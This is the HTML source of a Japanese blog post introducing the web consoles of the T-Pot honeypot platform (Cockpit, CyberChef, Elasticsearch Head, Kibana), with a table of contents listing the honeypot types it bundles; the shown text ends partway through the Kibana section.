&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E8%A8%98%E4%BA%8B%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot;&gt;記事について&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#t-pot%E3%81%AE%E5%90%84%E3%82%B3%E3%83%B3%E3%82%BD%E3%83%BC%E3%83%AB%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot;&gt;T-Potの各コンソールについて&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#cockpit&quot;&gt;Cockpit&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#cyberchef&quot;&gt;Cyberchef&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#elasticserch-head&quot;&gt;Elasticserch Head&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#kibana&quot;&gt;Kibana&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#security-meter&quot;&gt;Security Meter&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#spiderfoot&quot;&gt;Spiderfoot&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#t-potgithub&quot;&gt;T-Pot@Github&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E3%83%8F%E3%83%8B%E3%83%BC%E3%83%9D%E3%83%83%E3%83%88%E3%81%AE%E7%A8%AE%E9%A1%9E&quot;&gt;ハニーポットの種類&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#adbhoney&quot;&gt;ADBHoney&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#cisco-asa-honeypot&quot;&gt;Cisco ASA honeypot&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#honepot-for-cve-2019-19781-citrix-adc&quot;&gt;Honepot for CVE-2019-19781 (Citrix ADC)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#conpot&quot;&gt;CONPOT&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#cowrie&quot;&gt;Cowrie&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#ddospot&quot;&gt;DDoSPot&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#dicompot&quot;&gt;Dicompot&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#dionaea&quot;&gt;Dionaea&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#elasticpot&quot;&gt;ElasticPot&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#endlessh&quot;&gt;Endlessh&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#glutton&quot;&gt;Glutton&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#heralding&quot;&gt;Heralding&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#hellpot&quot;&gt;HellPot&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#honeypots&quot;&gt;Honeypots&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#honeypy&quot;&gt;HoneyPy&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#honeysap&quot;&gt;HoneySAP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#honeytrap&quot;&gt;Honeytrap&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#ipp-honey&quot;&gt;IPP Honey&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#log4pot&quot;&gt;Log4Pot&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#mailoney&quot;&gt;Mailoney&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#medpot&quot;&gt;medpot&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#rdpy&quot;&gt;RDPY&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#redishoneypot&quot;&gt;RedisHoneyPot&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#snare-and-tanner&quot;&gt;SNARE and TANNER&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;t-potの各コンソールについて&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#t-pot%E3%81%AE%E5%90%84%E3%82%B3%E3%83%B3%E3%82%BD%E3%83%BC%E3%83%AB%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot; aria-label=&quot;t potの各コンソールについて permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;T-Potの各コンソールについて&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;/honeypot-setup-on-azure&quot;&gt;前回の記事&lt;/a&gt;の最後に見た通り、ログイン後のT-Potのコンソールは以下のようになっています。&lt;/p&gt;
&lt;p&gt;今回は各コンソールについてそれぞれ見ていこうと思います。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/f0ab2d6a94b5abd4c24262218ad0c256/0b533/image-33.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 75.83333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAARlAAAEZQAGA43XUAAACPUlEQVQ4y61T227TQBCdtdfx3Y6dOEnj0OZGYqemqIibRGhaGokH/gAkXnkF/oBP4J1/PcxsUhFSJF76MFrv7pkzZ45niYjwoKFI/RekjvaaLBPHOFu4nIMLpdRfSfZR0r+Ky5m1P98XeeCW7z7ipI3pvEIUhuh2uhgOh3BdF49GI8RxjDzPUZYlAt9HGAfIsjafdQwuTdMDD/dtTpcNPn/5ygQlVqsVrq6ukHdyrN+8xngyQV3X2Gw26Pf6yLsx6lWFpmmwXq+xmD8+tGzHbHG0LG3UZFmGXr+P0PGwaJdIksQoHAwG8DwPpF0E3Iko6zNOcu61HPoRxuM5ZrMZzlfnWN9s0BRj/Hr/Hc2yxvmTBjfX10zQg3VacUc1VlVlOlkulvcVOkrD0hrato13osS2bMTah8/foqIoCnMnY2QzznEceOyp0vYfhfpgFKyjNdAeXk2fY86qLy8vsb3dYtAf3JvRJXXQJm+Xd0ptzFUPIWkzR+pwDpUFv+UZhUEUIslS2I6Gz1ghEFyLbMwpR8p7j9VTk8xwsbjFU2sEh9XKhYA9Tgpol2yb4SW8pTN8oAoVFXhBIxbhGAGCcdmyPOLx+Xj9CT++/URNJ6bijOU/oxJiRUQtZHtyKfKOZthwJOTihCIu6BiMs39VqReCXvpTbNsX6KrQJIoabZS67E2BM7ZkSDG6FBiimAmkTQmXQ0hHlCBWfBdGoNb+pwiRgKSarEI+oYwV+mYvbRUUouTkO++EULwWlfKmZRJ+A3asU7y3MdUnAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/f0ab2d6a94b5abd4c24262218ad0c256/8ac56/image-33.webp 240w,
/static/f0ab2d6a94b5abd4c24262218ad0c256/d3be9/image-33.webp 480w,
/static/f0ab2d6a94b5abd4c24262218ad0c256/b0a15/image-33.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/f0ab2d6a94b5abd4c24262218ad0c256/8ff5a/image-33.png 240w,
/static/f0ab2d6a94b5abd4c24262218ad0c256/e85cb/image-33.png 480w,
/static/f0ab2d6a94b5abd4c24262218ad0c256/0b533/image-33.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/f0ab2d6a94b5abd4c24262218ad0c256/0b533/image-33.png&quot;
            alt=&quot;image-33.png&quot;
            title=&quot;image-33.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;cockpit&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#cockpit&quot; aria-label=&quot;cockpit permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Cockpit&lt;/h3&gt;
&lt;p&gt;「Cockpit」はLinuxシステムのコンテナ、ストレージ、ネットワーク、サービス、ログなどの監視を行うことができるWEBコンソールアプリケーションです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/cockpit-project/cockpit&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;cockpit-project/cockpit: There’s code a goin’ on&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/f4f504f1208b469e47152dc3e7d9cbd7/0b533/image-57.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 70%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAARlAAAEZQAGA43XUAAACMUlEQVQ4y52Tb2/SUBTG+SbqC4OJEwSzOQYIhfKfyAvd3DS+MPEr4mTfwhe6ZLqwJcvIWIFCC21ve+/juZcWJlmi8aZP7ult+svznNPGEqkUUukX2Eok8ODhIzyOx1HUNJTLZei6jnqjgUakZhPVak09K5HK9yj2rNLBblFHqdFGtlRB+80BJhMTrutgcHOD0199fD87x4+f5/h2eobhrQHHdTGxHdoZfN8HY2ylWHI7g1K9jc7+EbRaCx8+fcZ4PIZpTtC/6OP4+Au63S6+9nronZzg4vIScnHOcd+KxZ8msBc63MlrePv+I0ajETzPU/IFlO4uj/lY+AEWTIqr3Sa3C58vgdu5IgrVBp7vZvF6/x1FniiH14MBrgyq5w6EEAiCAIKcOR6D5fnqjEvRmU/PZK2AOwTU6i2kMjkCHsKybOqhixFFN8ypuqe35aWW7FsE53y5R/USSFGXDnPoHBxhOBzCMAyl6dRUzZYwERIZAT2K7IZakGOH2iBrAiYpcgHFWhPpvTwN5xC3BPIJYs3nGM89irfsl1wSKgFz6h0LBBgXIZirOnRYhN7q4OWrkurhbDb7YwiRs6h2aVjMX0cVIhTnocNsAflKfdVDczpdfRoi7N3dyHIAgRrEWozO5B57spVEmkAZTSdgfgMoQqBYgQmr3Nk0ZdkGl2I7FFd+Nu6/ADdjy922bdiWRcPyVlEjbQBzfwXKNlgEjGJKt0ph/V8OHdcL/5L1nzJzPBX9NxZIjCLRDIzyAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/f4f504f1208b469e47152dc3e7d9cbd7/8ac56/image-57.webp 240w,
/static/f4f504f1208b469e47152dc3e7d9cbd7/d3be9/image-57.webp 480w,
/static/f4f504f1208b469e47152dc3e7d9cbd7/b0a15/image-57.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/f4f504f1208b469e47152dc3e7d9cbd7/8ff5a/image-57.png 240w,
/static/f4f504f1208b469e47152dc3e7d9cbd7/e85cb/image-57.png 480w,
/static/f4f504f1208b469e47152dc3e7d9cbd7/0b533/image-57.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/f4f504f1208b469e47152dc3e7d9cbd7/0b533/image-57.png&quot;
            alt=&quot;image-57.png&quot;
            title=&quot;image-57.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;上記の画像の通り、システムリソースの使用状況などもリアルタイムで可視化してくれています。&lt;/p&gt;
&lt;p&gt;便利。&lt;/p&gt;
&lt;h3 id=&quot;cyberchef&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#cyberchef&quot; aria-label=&quot;cyberchef permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Cyberchef&lt;/h3&gt;
&lt;p&gt;T-Potマシン内で利用できるローカル版のCyberchefが用意されています。&lt;/p&gt;
&lt;h3 id=&quot;elasticserch-head&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#elasticserch-head&quot; aria-label=&quot;elasticserch head permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Elasticserch Head&lt;/h3&gt;
&lt;p&gt;Elastic Search Clusterを参照、操作するためのWEBコンソールです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://mobz.github.io/elasticsearch-head/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ElasticSearch Head&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.elastic.co/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Free and Open Search: The Creators of Elasticsearch, ELK &amp;#x26; Kibana | Elastic&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Elastic Searchとは、分散型の検索および分析エンジンです。&lt;/p&gt;
&lt;p&gt;要するに大量の情報から必要な情報を効率的に抽出するためのツールといったイメージです。&lt;/p&gt;
&lt;p&gt;Elasticserchは色々な用途で使用できるみたいですね。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/e6a143048f9e5c511fee00d6e6b03279/0b533/image-59.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 67.5%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAARlAAAEZQAGA43XUAAAB2ElEQVQ4y41T226jQAzl//9p+5DXrdRqc6PZXLglVVJBKNcBBk5tw5CEqlJHsgY84zPHx7bVdR3YeL2fTnh+/ovNZoP5fC77druV/fX1BfPFAsvlEm/2GxZ0XjeNxN1jWOajocPL5QLf9+F5HlzXheu58m3+HceRPTgeEQQB4s/PEciAWhhW27ZiZvEDZVn2pkphU1WV+AeE3oARUBhmFKC1xu1Eo0hjZHl+8+kO+TV58JELSaGQZelIRBhuKY3z+SxMNLNUFYLdHrZtI8+LPrjROBxcSZPv1cxUt3CO7/hP+l7jWNgLYFXXfRCzJEdNwblS/B5MQhyclWrUycijqnqUy2RpMXJRFKM2uu2EAfuUABM0BTSVEhajj15T9F+WxYOOlnPYY7Va4UgtwyslXTzyrddrqWjDL5M59j/8eXrCabjHrHzPx26/Q01ZsgkgC8268Ou9Xo2IzxdMKqxtRDqlaSp+oxef8y6ATf3YNkM34dY4d0UmDUvVg+gBpCVrdPftrhV+hEiS5BZcVojDECFZPRSs674HmgJNzeIpYF24CNJPVBSHxm02myGmNH8Knjb0yNBMQ5Zl4uCJCKMroijqe3Noh/sRm87vPag1TYY14r6bpvfb9QWA7kCgwmj8MQAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/e6a143048f9e5c511fee00d6e6b03279/8ac56/image-59.webp 240w,
/static/e6a143048f9e5c511fee00d6e6b03279/d3be9/image-59.webp 480w,
/static/e6a143048f9e5c511fee00d6e6b03279/b0a15/image-59.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/e6a143048f9e5c511fee00d6e6b03279/8ff5a/image-59.png 240w,
/static/e6a143048f9e5c511fee00d6e6b03279/e85cb/image-59.png 480w,
/static/e6a143048f9e5c511fee00d6e6b03279/0b533/image-59.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/e6a143048f9e5c511fee00d6e6b03279/0b533/image-59.png&quot;
            alt=&quot;image-59.png&quot;
            title=&quot;image-59.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.elastic.co/elasticsearch/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Elasticsearch: The Official Distributed Search &amp;#x26; Analytics Engine | Elastic&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;いまいちよくわかってないですが、Elasticsearchは検索トラフィックの増加とデータ、書き込みの分散を行うため、複数のElasticsearch Server Nodeで構成されたClusterを利用するようです。&lt;/p&gt;
&lt;p&gt;Elasticserch Headは恐らくこのClusterを操作できるツールなのかと思っています。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/d7b44705f92eaa9c63fd9472fa1c072a/0b533/image-58.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 35.416666666666664%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAARlAAAEZQAGA43XUAAABJElEQVQoz62Q/W6CQBDEff/36t+N0ibVRhTt8XlwHxwgKvy6aNMncJPNbHIzu3Oz2u62RNs977uT9JnPQ0qWl6hCsTluWMdrqrrEOUvdNGitaYzBeUcbAtYJto5SN6wPOSukbtNMUgjZes65pu8H+mEgryyN7YiPKao0aOPY7WOKSvPxtSNOTvg2kKQF+5MiLarnwqWGG3LN8h3vUSrBW4N3I8Z7lFN015FJeLa/0Y932v4qeGOeob1MdOPEeJ9ZqSxH5Rm6KcRRJo5qcTfykx6J1m8cjhGHIiKtEkJoKfSTs/Cv4ygmDJXMVZ2LWycLy5qstpKJfTy2IroMF3zwOOnQdZJR93AfuoBxjQi9oGGQWBb+Mps/7f+XX1WraZokh/ll/QsMmxisGkrgYwAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/d7b44705f92eaa9c63fd9472fa1c072a/8ac56/image-58.webp 240w,
/static/d7b44705f92eaa9c63fd9472fa1c072a/d3be9/image-58.webp 480w,
/static/d7b44705f92eaa9c63fd9472fa1c072a/b0a15/image-58.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/d7b44705f92eaa9c63fd9472fa1c072a/8ff5a/image-58.png 240w,
/static/d7b44705f92eaa9c63fd9472fa1c072a/e85cb/image-58.png 480w,
/static/d7b44705f92eaa9c63fd9472fa1c072a/0b533/image-58.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/d7b44705f92eaa9c63fd9472fa1c072a/0b533/image-58.png&quot;
            alt=&quot;image-58.png&quot;
            title=&quot;image-58.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;細かい使い方については、またそのうち別の記事で書きます。&lt;/p&gt;
&lt;h3 id=&quot;kibana&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#kibana&quot; aria-label=&quot;kibana permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Kibana&lt;/h3&gt;
&lt;p&gt;Kibanaは、Elasticserchと連携してデータを可視化するためのツールです。&lt;/p&gt;
&lt;p&gt;Elasticserchに格納されているデータを用いて、Kibanaでデータ分析やグラフィカルな可視化を行うことができます。&lt;/p&gt;
&lt;p&gt;T-Potでは、デフォルトで各ハニーポットの収集した情報を可視化するダッシュボードが作成されていました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 495px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/63bb1a26b1151916ee75c350a40556c1/a4d88/image-61.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
